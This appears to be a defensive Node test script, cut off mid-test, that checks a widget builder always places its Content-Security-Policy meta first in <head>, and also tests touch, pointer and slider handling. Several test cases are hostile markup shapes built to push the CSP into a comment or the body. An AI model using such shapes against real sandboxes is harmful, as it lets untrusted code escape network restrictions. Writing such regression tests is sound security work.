// tools/widget-csp-gates.mjs — the widget sandbox's network lock is ours,
// whatever the model's markup says.
//
// Run:  node tools/widget-csp-gates.mjs [--builder <path to a renderWidget.ts>] [--ai <path to an ai.js>]
//
// The second half is the PHONE half of the same head (`widgetTouch.ts`): a
// mouse-only build's drag target gets touch-action: none and a finger reaches
// it as mouse events, a build handling pointers itself is left alone, and the
// compiler's prompt asks for pointer events and 44px controls.
//
// Why this exists: a compiled widget is a model-written HTML document run in
// a sandboxed iframe (allow-scripts, opaque origin). What keeps it off the
// network is ONE element — the CSP meta `buildWidgetDoc` adds — and that
// element only counts if the parser puts it in <head> before anything the
// build wrote. The builder used to find the first textual `<head…>` with a
// regex and splice after it, so `<!-- <head> --><head></head>` put the whole
// injection inside a comment, and a `<header>` in a head-less build put it in
// the BODY, where a CSP meta is ignored. Either way the widget could fetch.
//
// This parses the builder's output with a real HTML parser (jsdom, parse5)
// for hostile and ordinary shapes and asserts, for each:
//   - the CSP meta is the FIRST element child of document.head, full policy;
//   - the theme style and the harness script are in <head> as elements;
//   - the theme tail is a real script after the build's own content;
//   - an ordinary widget keeps its own head elements, body and script.
// `--builder` runs the same cases against another copy of the file (the
// control: `git show HEAD:src/components/visuals/renderWidget.ts`).
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { mkdtempSync, rmSync, readFileSync, mkdirSync } from 'node:fs';
import { join, resolve, dirname } from 'node:path';
import v8 from 'node:v8';
import vm from 'node:vm';
import { get } from 'node:http';

const require = createRequire(import.meta.url);
const esbuild = require('esbuild');
const { JSDOM } = require('jsdom');

const here = dirname(fileURLToPath(import.meta.url));
const root = resolve(here, '..');
const argAt = process.argv.indexOf('--builder');
const builderPath = argAt !== -1 ? resolve(process.argv[argAt + 1]) : join(root, 'src/components/visuals/renderWidget.ts');
const aiAt = process.argv.indexOf('--ai');
const aiPath = aiAt !== -1 ? resolve(process.argv[aiAt + 1]) : join(root, 'server/ai.js');

const cache = join(root, 'node_modules', '.cache');
mkdirSync(cache, { recursive: true });
const scratch = mkdtempSync(join(cache, 'widget-csp-gates-'));
const out = join(scratch, 'bundle.cjs');

// The builder reads the host's root font size off the live document.
const host = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost/' });
globalThis.window = host.window;
globalThis.document = host.window.document;
globalThis.getComputedStyle = host.window.getComputedStyle.bind(host.window);

const stubs = {
    store: 'export const useStore = () => undefined;',
    api: 'export const api = {};',
    i18n: 'export default { t: (k) => k, language: "en" }; export const currentLocale = () => "en-GB";',
};
// The builder's file is bundled from its CONTENTS with the visuals folder as
// its resolve dir, so a copy of it anywhere on disk resolves the same siblings.
await esbuild.build({
    stdin: {
        contents: readFileSync(builderPath, 'utf8') + '\nexport { WIDGET_THEME_TAIL as __TAIL } from "./widgetTheme";'
            + '\nexport { SANDBOX_LOCKDOWN_JS as __LOCK, leavesTheFrame as __LEAVES } from "./sandboxLockdown";',
        resolveDir: join(root, 'src/components/visuals'),
        loader: 'ts',
        sourcefile: 'renderWidget.ts',
    },
    bundle: true, format: 'cjs', platform: 'node', outfile: out,
    packages: 'external',
    plugins: [{
        name: 'stubs',
        setup(b) {
            b.onResolve({ filter: /(^|\/)(?:\.\.\/)+(api|store|i18n)$/ }, a => ({ path: a.path.split('/').pop(), namespace: 'stub' }));
            b.onLoad({ filter: /.*/, namespace: 'stub' }, a => ({ contents: stubs[a.path], loader: 'js' }));
        },
    }],
    logLevel: 'silent',
});
const { buildWidgetDoc, __TAIL: TAIL, __LOCK: LOCKDOWN, __LEAVES: leavesTheFrame } = require(out);
rmSync(scratch, { recursive: true, force: true });

const POLICY = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:;";
const palette = {
    theme: 'light:#ffffff', dark: false, bg: '#ffffff', fg: '#0f172a', muted: '#64748b', border: '#e2e8f0',
    accent: '#0e7490', accentFg: '#0e7490', accent2: '#b45309', series: ['#0e7490', '#b45309', '#7c3aed'],
};
const TOKEN = 'tok-csp-gate';
// What the build itself does: a marked script, so we can find it after parsing.
const BUILD = '<div id="w">widget</div><script>/*BUILD*/window.x=1;</script>';

let pass = 0, fail = 0;
const check = (label, cond, extra = '') => {
    if (cond) pass++; else fail++;
    console.log(`${cond ? 'PASS' : 'FAIL'}  ${label}${!cond && extra ? `  — ${extra}` : ''}`);
};

function inspect(label, html, { ownHead = [] } = {}) {
    for (const probe of [false, true]) {
        const doc = buildWidgetDoc(html, TOKEN, { probe, palette });
        const d = new JSDOM(doc).window.document;
        const tag = `${label}${probe ? ' (probe)' : ''}`;
        const first = d.head && d.head.firstElementChild;
        check(`${tag}: the CSP meta is the first element in <head>`,
            !!first && first.localName === 'meta'
            && (first.getAttribute('http-equiv') || '').toLowerCase() === 'content-security-policy',
            first ? `first is <${first.localName}>` : 'no head child');
        check(`${tag}: … with the whole policy`, first?.getAttribute('content') === POLICY, first?.getAttribute('content'));
        const firstScript = d.querySelector('script');
        check(`${tag}: the first script of the document takes WebRTC away, before anything else runs`,
            first?.nextElementSibling === firstScript && firstScript?.textContent === LOCKDOWN,
            `second head element <${first?.nextElementSibling?.localName}>, first script starts "${firstScript?.textContent.slice(0, 40)}"`);
        check(`${tag}: the theme style and the harness are head elements`,
            d.head.querySelector('style#__w-theme') !== null
            && [...d.head.querySelectorAll('script')].some(s => s.textContent.includes(JSON.stringify(TOKEN))));
        const scripts = [...d.querySelectorAll('script')];
        const build = scripts.findIndex(s => s.textContent.includes('/*BUILD*/'));
        const tail = scripts.findIndex(s => s.textContent === TAIL);
        check(`${tag}: the build's own script survives, and the tail runs after it`,
            build !== -1 && tail > build, `build #${build}, tail #${tail}`);
        check(`${tag}: nothing we inject is left as text`,
            !d.documentElement.textContent.includes('Content-Security-Policy')
            && ![...d.querySelectorAll('*')].some(el => [...el.attributes].some(a => a.value.includes('Content-Security-Policy') && el !== first)));
        for (const sel of ownHead) {
            check(`${tag}: the build's own ${sel} stays in <head>`, d.head.querySelector(sel) !== null);
        }
    }
}

console.log(`builder: ${builderPath}\n`);

// Ordinary shapes the compiler actually produces.
inspect('a full document', `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Pendulum</title><style>#w{color:red}</style></head><body>${BUILD}</body></html>`,
    { ownHead: ['title', 'style:not(#__w-theme)', 'meta[charset]'] });
inspect('no <head>', `<!doctype html><html><body>${BUILD}</body></html>`);
inspect('no <html> at all', BUILD);
inspect('upper-case tags', `<!DOCTYPE HTML><HTML><HEAD><STYLE>#w{}</STYLE></HEAD><BODY>${BUILD}</BODY></HTML>`, { ownHead: ['style:not(#__w-theme)'] });
inspect('two <head>s', `<!doctype html><html><head><style>#w{}</style></head><head></head><body>${BUILD}</body></html>`, { ownHead: ['style:not(#__w-theme)'] });
inspect('a leading BOM and whitespace', `﻿  \n<!doctype html><html><head><style>#w{}</style></head><body>${BUILD}</body></html>`, { ownHead: ['style:not(#__w-theme)'] });

// Hostile shapes: the first textual `<head` is not the head.
inspect('<head> inside a comment', `<!doctype html><html><!-- <head> --><head></head><body>${BUILD}</body></html>`);
inspect('<head> inside an attribute value', `<!doctype html><html data-x="<head>"><head></head><body>${BUILD}</body></html>`);
inspect('<head> inside <title>', `<!doctype html><html><title><head></title><body>${BUILD}</body></html>`);
inspect('<head> inside a script string', `<!doctype html><html><script>var s = "<head>";</script><body>${BUILD}</body></html>`);
inspect('a <header> and no <head>', `<!doctype html><html><body><header>Title</header>${BUILD}</body></html>`);
inspect('<head> inside a <textarea>', `<!doctype html><html><body><textarea><head></textarea>${BUILD}</body></html>`);
inspect('</body> inside a trailing comment', `<!doctype html><html><head></head><body>${BUILD}</body></html><!-- </body> -->`);

// ---------------------------------------------------------------------------
// The same head carries the phone half (`widgetTouch.ts`), because a cached
// build is mouse-only and only the host can reach it without a rebuild. Run
// against HEAD's builder, every POSITIVE check below fails (nothing sets
// touch-action, a touch pointer reaches a mouse-only build as nothing). The
// negatives — a mouse, a slider, a pointer-handling build, a list — pass on
// HEAD too: they pin what the touch half must leave alone, not the fix.
// jsdom has no layout and no `elementFromPoint`, so a move lands on the drag's
// own target, and the slider checks stand heights in by hand; what a slider
// looks like grown is measured in Edge (temp/phone-widget), not here.
console.log('\nthe phone half of the head');

// A touch screen by default (`maxTouchPoints`); `{ touch: false }` is a desktop.
async function run(body, beforeParse, { touch = true } = {}) {
    const doc = buildWidgetDoc(`<!doctype html><html><head></head><body>${body}</body></html>`, TOKEN, { probe: false, palette });
    const dom = new JSDOM(doc, { runScripts: 'dangerously', pretendToBeVisual: true, beforeParse(win) {
        Object.defineProperty(win.navigator, 'maxTouchPoints', { value: touch ? 5 : 0, configurable: true });
        beforeParse?.(win);
    } });
    await new Promise((r) => dom.window.addEventListener('load', () => setTimeout(r, 0)));
    return dom.window;
}
const pointer = (w, type, target, init = {}) => {
    const e = new w.PointerEvent(type, { bubbles: true, cancelable: true, composed: true, pointerId: 7, isPrimary: true, pointerType: 'touch', ...init });
    target.dispatchEvent(e);
    return e;
};
// A drag written the way the compiler wrote them: mouse handlers only.
const MOUSE_ONLY = `<input id="r" type="range"><button id="b">Go</button><canvas id="c"></canvas><div id="p"></div>
<script>window.got=[];const c=document.getElementById('c');
c.addEventListener('mousedown',e=>got.push('down@'+e.clientX+':'+e.buttons));
window.addEventListener('mousemove',e=>got.push('move@'+e.clientX+':'+e.buttons));
window.addEventListener('mouseup',e=>got.push('up@'+e.clientX));
document.getElementById('p').onmousedown=()=>got.push('prop');
document.getElementById('b').addEventListener('mousedown',()=>{});
document.addEventListener('mousedown',()=>{});</script>`;

{
    const w = await run(MOUSE_ONLY);
    const d = w.document, c = d.getElementById('c');
    check('a canvas the build drags gets touch-action: none', c.style.touchAction === 'none', `"${c.style.touchAction}"`);
    check('… and so does an element given an onmousedown property', d.getElementById('p').style.touchAction === 'none');
    check('the page, the body and native controls keep their own (the page still scrolls)',
        !d.documentElement.style.touchAction && !d.body.style.touchAction
        && !d.getElementById('r').style.touchAction && !d.getElementById('b').style.touchAction);
    const down = pointer(w, 'pointerdown', c, { clientX: 40, clientY: 10 });
    pointer(w, 'pointermove', c, { clientX: 120, clientY: 12 });
    pointer(w, 'pointerup', c, { clientX: 130, clientY: 12 });
    // A mouse is over a point before it presses there, so a build that reads
    // where the pointer is from its last mousemove picks the right place.
    check('a finger dragging a mouse-only canvas arrives as a mouse: moves there, presses, drags, lifts',
        w.got.join(' ') === 'move@40:0 down@40:1 move@120:1 up@130', w.got.join(' '));
    check('… and its pointerdown is cancelled, so the browser adds no second mousedown on a tap', down.defaultPrevented);
    w.got.length = 0;
    pointer(w, 'pointerdown', c, { pointerType: 'mouse', clientX: 5 });
    pointer(w, 'pointerup', c, { pointerType: 'mouse', clientX: 5 });
    check('a real mouse is left to the browser', w.got.length === 0, w.got.join(' '));
    const onSlider = pointer(w, 'pointerdown', d.getElementById('r'), { clientX: 5 });
    pointer(w, 'pointerup', d.getElementById('r'), { clientX: 5 });
    check('a finger on a native slider is never taken over', !onSlider.defaultPrevented && w.got.length === 0, w.got.join(' '));
    const style = d.getElementById('__w-touch');
    check('the touch sizes sit in the head, under a coarse pointer only, at 44px',
        !!style && style.parentNode === d.head && /@media \(pointer:coarse\)\{[^}]*button[^}]*min-height:44px/.test(style.textContent)
        && !/min-width:44px/.test(style.textContent));
    // A width of 44 pushed a row of small buttons past a 360px frame, which a
    // cached build does not wrap; height alone is the target.
    // Nothing outside the media query: a desktop widget must lay out exactly
    // as before, and a canvas is never squeezed (presses map off clientX).
    const css = style ? style.textContent : '';
    check('… and nothing of it applies to a mouse, nor squeezes a canvas',
        css.startsWith('@media (pointer:coarse){') && css.endsWith('}') && css.indexOf('}}') === css.length - 2
        && !/canvas/.test(css), css);

    // A finger lifted off-screen sends pointercancel, often at 0,0: the drag
    // ends where it last was, never at the corner.
    w.got.length = 0;
    pointer(w, 'pointerdown', c, { clientX: 40 });
    pointer(w, 'pointermove', c, { clientX: 120 });
    pointer(w, 'pointercancel', c, { clientX: 0 });
    check('a cancelled drag ends where the finger last was', w.got.join(' ') === 'move@40:0 down@40:1 move@120:1 up@120', w.got.join(' '));
    // A lift that never arrived must not lock out every later drag.
    w.got.length = 0;
    pointer(w, 'pointerdown', c, { clientX: 10 });
    pointer(w, 'pointermove', c, { clientX: 20 });
    pointer(w, 'pointerdown', c, { clientX: 50, pointerId: 8 });
    check('a new finger ends a drag whose lift was lost, then starts its own',
        w.got.join(' ') === 'move@10:0 down@10:1 move@20:1 up@20 move@50:0 down@50:1', w.got.join(' '));
}
{
    // On a computer with no touch screen the head decides nothing.
    const w = await run(MOUSE_ONLY, null, { touch: false });
    const c = w.document.getElementById('c');
    check('with no touch screen nothing is given touch-action', !c.style.touchAction);
    // A screen that reports its touch late (an emulator; a tablet docked into
    // a keyboard) is decided at the first finger instead.
    pointer(w, 'pointerdown', c, { clientX: 1 });
    pointer(w, 'pointerup', c, { clientX: 1 });
    await new Promise((r) => setTimeout(r, 80));
    check('… until a finger touches it, and then the canvas is claimed', c.style.touchAction === 'none', `"${c.style.touchAction}"`);
}
{
    // The drag handler on the DOCUMENT: the canvas under it is the surface,
    // or the browser pans and cancels the synthetic drag after a few pixels.
    const w = await run(`<p>Text</p><canvas id="c"></canvas><script>window.got=[];
document.addEventListener('mousedown',e=>got.push('down@'+e.clientX));
document.addEventListener('mousemove',e=>got.push('move@'+e.clientX));
document.addEventListener('mouseup',e=>got.push('up@'+e.clientX));</script>`);
    const c = w.document.getElementById('c');
    check('a document-level drag claims the canvas under it', c.style.touchAction === 'none', `"${c.style.touchAction}"`);
    check('… and not the text beside it', !w.document.querySelector('p').style.touchAction);
    pointer(w, 'pointerdown', c, { clientX: 4 });
    pointer(w, 'pointerup', c, { clientX: 9 });
    check('… and the finger arrives as the mouse it listens for', w.got.join(' ') === 'move@4 down@4 up@9', w.got.join(' '));
    // A canvas the build adds after the page loaded (a second tab, a redraw).
    const late = w.document.createElement('canvas');
    w.document.body.appendChild(late);
    await new Promise((r) => setTimeout(r, 80));
    check('… and a canvas the build adds after load is claimed too', late.style.touchAction === 'none', `"${late.style.touchAction}"`);
}
{
    // Listeners written into the markup are set by the parser, not through
    // any setter the head can patch, so they are read off the attributes.
    const w = await run(`<div id="i" onmousedown="got.push('inline')"></div><canvas id="t" onmousedown="got.push('mouse')" ontouchstart=""></canvas>
<script>window.got=[];window.addEventListener('mousemove',()=>{});</script>`);
    const d = w.document;
    check('an onmousedown attribute in the markup claims its element', d.getElementById('i').style.touchAction === 'none', `"${d.getElementById('i').style.touchAction}"`);
    pointer(w, 'pointerdown', d.getElementById('i'), { clientX: 2 });
    pointer(w, 'pointerup', d.getElementById('i'), { clientX: 2 });
    const own = pointer(w, 'pointerdown', d.getElementById('t'), { clientX: 2 });
    check('… and an ontouchstart attribute means the build handles the finger itself',
        w.got.join(' ') === 'inline' && !own.defaultPrevented, w.got.join(' '));
}
{
    // A build that adds its move listener inside mousedown has none until the
    // first press, after the browser has read touch-action for that finger.
    const LATE = `<canvas id="c"></canvas><div id="tap">Tap</div><script>window.got=[];const c=document.getElementById('c');
c.addEventListener('mousedown',()=>{window.addEventListener('mousemove',function mv(e){got.push('move@'+e.clientX)});});
document.getElementById('tap').addEventListener('mousedown',()=>got.push('tap'));</script>`;
    const w = await run(LATE);
    const d = w.document, c = d.getElementById('c');
    const touchmove = (el) => { const e = new w.TouchEvent('touchmove', { bubbles: true, cancelable: true }); el.dispatchEvent(e); return e; };
    check('a canvas whose move listener comes with the press is not claimed at load', !c.style.touchAction);
    check('… and a finger on it, not dragging, still scrolls', !touchmove(c).defaultPrevented);
    const tapDown = pointer(w, 'pointerdown', d.getElementById('tap'), { clientX: 1 });
    check('… so does a press on what only listens for presses', tapDown.defaultPrevented && !touchmove(d.getElementById('tap')).defaultPrevented);
    pointer(w, 'pointerup', d.getElementById('tap'), { clientX: 1 });
    pointer(w, 'pointerdown', c, { clientX: 10 });
    check('… but its first drag holds the page still, so the browser does not cancel it', touchmove(c).defaultPrevented);
    // The press added the move listener, so a pass runs mid-drag and sets
    // touch-action, which this gesture never reads: the hold must stay.
    await new Promise((r) => setTimeout(r, 80));
    check('… and still holds after the pass that sets touch-action mid-drag', touchmove(c).defaultPrevented);
    pointer(w, 'pointermove', c, { clientX: 30 });
    pointer(w, 'pointerup', c, { clientX: 30 });
    check('… and that first drag arrives', w.got.includes('move@30'), w.got.join(' '));
    await new Promise((r) => setTimeout(r, 80));
    check('… and from then on the canvas has touch-action: none', c.style.touchAction === 'none', `"${c.style.touchAction}"`);
}
{
    // An element the build drops and later puts back is still known.
    const w = await run(`<script>window.got=[];window.x=document.createElement('canvas');x.addEventListener('mousedown',()=>{});
window.addEventListener('mousemove',()=>{});</script>`);
    await new Promise((r) => setTimeout(r, 30));
    w.document.body.appendChild(w.x);
    await new Promise((r) => setTimeout(r, 80));
    check('a canvas put into the page after the head forgot it is claimed when it arrives', w.x.style.touchAction === 'none', `"${w.x.style.touchAction}"`);
}
{
    // On WINDOW, and through an on* property for the move half.
    const w = await run(`<canvas id="c"></canvas><script>window.got=[];
window.addEventListener('mousedown',e=>got.push('down@'+e.clientX));window.onmousemove=e=>got.push('move@'+e.clientX);</script>`);
    const c = w.document.getElementById('c');
    pointer(w, 'pointerdown', c, { clientX: 6 });
    pointer(w, 'pointermove', c, { clientX: 16 });
    pointer(w, 'pointerup', c, { clientX: 16 });
    check('a mousedown listener on window counts, and a move set as onmousemove makes it a drag',
        w.got.join(' ') === 'move@6 down@6 move@16' && c.style.touchAction === 'none', `${w.got.join(' ')} "${c.style.touchAction}"`);
}
{
    // A wrapper with a mousedown handler is not a drag surface; the canvas
    // inside it is. A list that selects on mousedown and drags nothing is
    // left to scroll, and so is anything whose touch-action the build set.
    const w = await run(`<style>.own{touch-action:pan-y}</style>
<ul id="l" style="overflow:auto"><li>One</li><li>Two</li></ul><div id="w"><span>Label</span><canvas id="c"></canvas></div>
<canvas id="o" class="own"></canvas><pre id="s" style="overflow:auto">a long line of text that scrolls</pre>
<svg id="g" viewBox="0 0 10 10"><g><circle id="h" cx="5" cy="5" r="2"></circle></g></svg>
<div id="track" style="cursor:grab"><div id="thumb"></div></div>
<script>window.got=[];document.getElementById('l').addEventListener('mousedown',()=>{});
document.getElementById('track').addEventListener('mousedown',()=>{});
document.getElementById('s').addEventListener('mousedown',()=>{});
document.getElementById('h').addEventListener('mousedown',()=>{});
document.getElementById('w').addEventListener('mousedown',()=>{});
document.getElementById('o').addEventListener('mousedown',()=>{});
window.addEventListener('mousemove',()=>{});</script>`);
    const d = w.document;
    check('a wrapper with a mousedown handler claims the canvas inside it, not itself',
        d.getElementById('c').style.touchAction === 'none' && !d.getElementById('w').style.touchAction);
    check('a scrolling list with a mousedown handler keeps its scroll', !d.getElementById('l').style.touchAction);
    check('… and so does a scrolling block with no children', !d.getElementById('s').style.touchAction);
    check('a handle drawn inside an svg claims the whole svg (the finger may slip off the handle)',
        d.getElementById('g').style.touchAction === 'none');
    check("a canvas whose touch-action the build's stylesheet set keeps it", !d.getElementById('o').style.touchAction);
    check('a wrapper with a grab cursor (a slider built of divs) is the surface itself',
        d.getElementById('track').style.touchAction === 'none' && !d.getElementById('thumb').style.touchAction);
}
{
    // A document-level drag claims the svgs in the page, but not a button's icon.
    const w = await run(`<button id="btn"><svg id="ic" viewBox="0 0 4 4"></svg> Reset</button><svg id="plot" viewBox="0 0 9 9"></svg>
<script>document.addEventListener('mousedown',()=>{});document.addEventListener('mousemove',()=>{});</script>`);
    check('an icon inside a button is not a drag surface',
        !w.document.getElementById('ic').style.touchAction && w.document.getElementById('plot').style.touchAction === 'none');
}
{
    // cursor inherits: a body set to `grabbing` mid-drag must not make every
    // wrapper under it a surface, which would end page scrolling for good.
    const w = await run(`<div id="app"><p>Text</p><canvas id="c"></canvas></div><label id="lb">Angle <svg id="dial" viewBox="0 0 9 9"></svg></label>
<script>document.body.style.cursor='grabbing';document.getElementById('app').addEventListener('mousedown',()=>{});
document.getElementById('dial').addEventListener('mousedown',()=>{});window.addEventListener('mousemove',()=>{});</script>`);
    const d = w.document;
    check('a cursor the wrapper only inherits does not make it a surface',
        !d.getElementById('app').style.touchAction && d.getElementById('c').style.touchAction === 'none', `"${d.getElementById('app').style.touchAction}"`);
    check('a dial svg inside a label is still a drag surface', d.getElementById('dial').style.touchAction === 'none', `"${d.getElementById('dial').style.touchAction}"`);
}
{
    // The touchmove hold costs scrolling from where it sits, so it goes only
    // on what a drag is drawn on, and goes once touch-action takes over.
    const added = [], removed = [];
    const w = await run(`<ul><li id="row">One</li></ul><canvas id="c"></canvas><script>
document.getElementById('row').addEventListener('mousedown',()=>{});
document.getElementById('c').addEventListener('mousedown',()=>{window.addEventListener('mousemove',()=>{});});</script>`, (win) => {
        const P = win.EventTarget.prototype, a = P.addEventListener, r = P.removeEventListener;
        P.addEventListener = function (type, ...rest) { if (type === 'touchmove') added.push(this.id || this.localName); return a.call(this, type, ...rest); };
        P.removeEventListener = function (type, ...rest) { if (type === 'touchmove') removed.push(this.id || this.localName); return r.call(this, type, ...rest); };
    });
    check('a tap-only row is not held, the canvas is', !added.includes('row') && added.includes('c'), added.join(' '));
    const c = w.document.getElementById('c');
    pointer(w, 'pointerdown', c, { clientX: 1 });
    pointer(w, 'pointerup', c, { clientX: 1 });
    await new Promise((r) => setTimeout(r, 80));
    check('… and once the canvas has touch-action, its hold is taken off', c.style.touchAction === 'none' && removed.includes('c'), removed.join(' '));
    // A move listener now exists, but a word that takes presses is tapped,
    // not dragged, so a swipe from it still scrolls the page.
    check('… while the text row it now shares a move listener with keeps its scroll', !w.document.getElementById('row').style.touchAction,
        `"${w.document.getElementById('row').style.touchAction}"`);
}
{
    // On a computer, a build that redraws its controls must not keep every
    // copy alive (nothing is decided there, so nothing ever pruned the list).
    v8.setFlagsFromString('--expose-gc');
    const gc = vm.runInNewContext('gc');
    const w = await run(`<script>window.refs=[];for(let i=0;i<300;i++){const b=document.createElement('div');
b.addEventListener('mousedown',()=>{});if(i%30===0)refs.push(new WeakRef(b));}</script>`, null, { touch: false });
    for (let i = 0; i < 4; i++) { gc(); await new Promise((r) => setTimeout(r, 10)); }
    const alive = w.refs.filter((r) => r.deref()).length;
    check('on a computer, elements the build threw away are freed', alive === 0, `${alive} of ${w.refs.length} still alive`);
}
{
    // A screen that reports touch late: its first press must already know the
    // markup's own pointer handlers, or a pointer build gets a second mousedown.
    const w = await run(`<canvas id="c" onpointerdown="got.push('own')"></canvas><script>window.got=[];
document.getElementById('c').addEventListener('mousedown',()=>got.push('mouse'));</script>`, null, { touch: false });
    const e = pointer(w, 'pointerdown', w.document.getElementById('c'), { clientX: 3 });
    check("the first finger on a late-touch screen sees the markup's onpointerdown", !e.defaultPrevented && w.got.join(' ') === 'own', w.got.join(' '));
}
{
    // A readout updated on every frame is not news: no pass (each pass reads
    // the document's markup handlers, so it is counted there).
    let reads = 0;
    const w = await run(`<span id="v">0</span><canvas id="c"></canvas><script>
document.getElementById('c').addEventListener('mousedown',()=>{});window.addEventListener('mousemove',()=>{});</script>`, (win) => {
        const q = win.Document.prototype.querySelectorAll;
        win.Document.prototype.querySelectorAll = function (...a) { reads++; return q.apply(this, a); };
    });
    await new Promise((r) => setTimeout(r, 80));
    const before = reads;
    for (let i = 0; i < 5; i++) w.document.getElementById('v').textContent = String(i);
    await new Promise((r) => setTimeout(r, 80));
    const text = reads - before;
    w.document.body.appendChild(w.document.createElement('canvas'));
    await new Promise((r) => setTimeout(r, 80));
    check('text written into a readout runs no pass, an added element does', text === 0 && reads - before > 0, `text ${text}, element ${reads - before}`);
}
{
    // No move listener anywhere: a mousedown is a press, not a drag.
    const w = await run(`<div id="t">Tap me</div><script>document.getElementById('t').addEventListener('mousedown',()=>{});</script>`);
    check('an element pressed but never dragged keeps the page scrolling', !w.document.getElementById('t').style.touchAction);
}
{
    // A move handler set as a PROPERTY is a pointer handler too.
    const w = await run(`<canvas id="c"></canvas><script>window.got=[];const c=document.getElementById('c');
c.onmousedown=()=>got.push('mouse');c.onpointermove=()=>got.push('pmove');</script>`);
    const down = pointer(w, 'pointerdown', w.document.getElementById('c'), { clientX: 3 });
    check('a build with an onpointermove property is left to its own pointer handling',
        !w.got.includes('mouse') && !down.defaultPrevented, w.got.join(' '));
}
{
    // A build that already handles pointers must not get a second mousedown.
    const w = await run(`<canvas id="c"></canvas><script>window.got=[];const c=document.getElementById('c');
c.addEventListener('pointerdown',()=>got.push('pointer'));c.addEventListener('pointermove',()=>{});c.addEventListener('mousedown',()=>got.push('mouse'));</script>`);
    const c = w.document.getElementById('c');
    const down = pointer(w, 'pointerdown', c, { clientX: 3 });
    pointer(w, 'pointerup', c, { clientX: 3 });
    check('a build with its own pointer handlers is left to them (no synthetic mouse)',
        w.got.join(' ') === 'pointer' && !down.defaultPrevented, w.got.join(' '));
    check('… and its drag target still gets touch-action: none', c.style.touchAction === 'none');
}
{
    // Pointer handling on window alone (the usual move/up half of a drag).
    const w = await run(`<div id="d"></div><script>window.got=[];document.getElementById('d').addEventListener('mousedown',()=>got.push('mouse'));
window.addEventListener('pointermove',()=>{});</script>`);
    const down = pointer(w, 'pointerdown', w.document.getElementById('d'), { clientX: 2 });
    check('… also when it listens for pointers only on window', w.got.length === 0 && !down.defaultPrevented, w.got.join(' '));
}
{
    // The harness listens for pointerdown/touchstart on window itself; those
    // must not read as the build handling fingers.
    const w = await run(`<div id="d"></div><script>window.got=[];document.getElementById('d').addEventListener('mousedown',()=>got.push('down'));</script>`);
    pointer(w, 'pointerdown', w.document.getElementById('d'), { clientX: 1 });
    check("the host's own listeners do not count as the build's", w.got.join(' ') === 'down', w.got.join(' '));
}
{
    // Sliders, with the layout jsdom lacks stood in for: a finger's pointer, a
    // height per slider, and a ResizeObserver the test fires by hand. A slider
    // with no size at load (a closed tab the build opens by setting
    // `style.display`, which no attribute filter sees) is grown once it has one.
    const heights = { now: 16, late: 0 }, observers = [];
    const stub = (coarse) => (win) => {
        win.matchMedia = (q) => ({ matches: coarse && /coarse/.test(q), media: q, addEventListener() {}, removeEventListener() {} });
        win.ResizeObserver = class { constructor(cb) { this.cb = cb; this.els = new Set(); observers.push(this); } observe(el) { this.els.add(el); } unobserve(el) { this.els.delete(el); } disconnect() { this.els.clear(); } };
        const rect = win.HTMLElement.prototype.getBoundingClientRect;
        win.HTMLElement.prototype.getBoundingClientRect = function () {
            return this.id in heights ? { x: 0, y: 0, top: 0, left: 0, right: 100, bottom: heights[this.id], width: 100, height: heights[this.id] } : rect.call(this);
        };
    };
    const SLIDERS = '<input id="now" type="range"><div id="tab" style="display:none"><input id="late" type="range"></div>';
    const w = await run(SLIDERS, stub(true));
    const d = w.document;
    check('under a finger, a native slider is grown to 44px', d.getElementById('now').style.minHeight === '44px', `"${d.getElementById('now').style.minHeight}"`);
    heights.late = 16;
    d.getElementById('tab').style.display = 'block';
    for (const o of observers) if (o.els.size) o.cb([...o.els].map((target) => ({ target })), o);
    await new Promise((r) => setTimeout(r, 80));
    check('… and so is one the build reveals later by setting its style', d.getElementById('late').style.minHeight === '44px', `"${d.getElementById('late').style.minHeight}"`);
    heights.late = 0;
    const desk = await run(SLIDERS, stub(false));
    check('with a mouse no slider is touched', !desk.document.getElementById('now').style.minHeight);
}
{
    const src = readFileSync(aiPath, 'utf8');
    const prompt = src.slice(src.indexOf('const WIDGET_COMPILER_SYSTEM'), src.indexOf('export function widgetCompilePrompt'));
    check('the compiler is told: Pointer Events, touch-action on the dragged element only, 44px, 360px, no hover-only',
        /Pointer Events/.test(prompt) && /touch-action: none on the ONE element/.test(prompt)
        && /44px/.test(prompt) && /360px/.test(prompt) && /hover/.test(prompt));
    check('… and: one slider style in the accent, every row in ONE label | slider | value grid',
        /accent-color: var\(--w-accent\)/.test(prompt) && /never restyle one/.test(prompt)
        && /ONE grid/.test(prompt) && /same x/.test(prompt) && /tabular-nums/.test(prompt));
}

// Sliders look alike and line up — on a desktop too, so no touch here. jsdom
// has no layout: a box's width is stood in by its text length (9px a
// character) plus any min-width the head set, which is what a browser's
// shrink-to-fit width does for a label. The real tracks are measured in Edge.
// Against main every positive check here fails (nothing aligns, nothing turns
// native). The "left alone" checks (one row, grid and column rows, steppers,
// a column with no room, all-drawn and invisible sliders) pass on main too:
// they pin what the slider half must not touch, not the fix.
console.log('\nsliders: one look, tracks that line up');
async function sliders(body) {
    return run(body, (win) => {
        const rect = win.HTMLElement.prototype.getBoundingClientRect;
        win.HTMLElement.prototype.getBoundingClientRect = function () {
            if (this.tagName === 'INPUT' || this.tagName === 'BODY' || this.tagName === 'HTML') return rect.call(this);
            const hidden = this.closest('[hidden]') || /none/.test(this.style.display) || this.closest('[style*="display:none"]');
            // data-pad stands in for horizontal padding: on top of the text,
            // and on top of a min-width too unless that min-width is border-box.
            const pad = Number(this.dataset.pad) || 0;
            const text = this.children.length > 1 ? 300 : 9 * (this.textContent || '').length + pad;
            const min = (parseFloat(this.style.minWidth) || 0) + (this.style.minWidth && this.style.boxSizing !== 'border-box' ? pad : 0);
            const w = hidden ? 0 : Math.max(text, min);
            return { x: 0, y: 0, top: 0, left: 0, right: w, bottom: 20, width: w, height: 20 };
        };
    }, { touch: false });
}
const ROWS = `<style>.row{display:flex;align-items:center}</style>
<div class="row"><label>Mass</label><input id="a" type="range"><span id="av">3 kg</span></div>
<div class="row"><label>Spring const</label><input id="b" type="range"><span id="bv">5</span></div>`;
{
    const w = await sliders(ROWS), d = w.document;
    const [l1, l2] = d.querySelectorAll('label');
    check('two flex slider rows: the short label is given the long one\'s width', l1.style.minWidth === '108px' && l2.style.minWidth === '108px', `${l1.style.minWidth} ${l2.style.minWidth}`);
